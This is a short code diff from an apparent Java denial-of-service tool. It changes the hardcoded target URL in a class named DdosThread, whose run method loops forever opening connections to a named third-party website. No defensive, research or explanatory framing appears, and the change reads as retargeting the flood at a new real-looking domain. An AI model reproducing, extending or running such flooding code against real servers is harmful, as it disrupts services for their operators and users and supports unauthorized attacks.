@@ -24,7 +24,7 @@ public class DdosThread implements Runnable {
     public void run() {
         while (true) {
             try {
-                URL url = new URL("https://cityonchain.com/channelMap");
+                URL url = new URL("https://blockapp.yinmimoney.com/api/city/zoom");
                 URLConnection conn = url.openConnection();
                 BufferedInputStream bis = new BufferedInputStream(
                         conn.getInputStream());
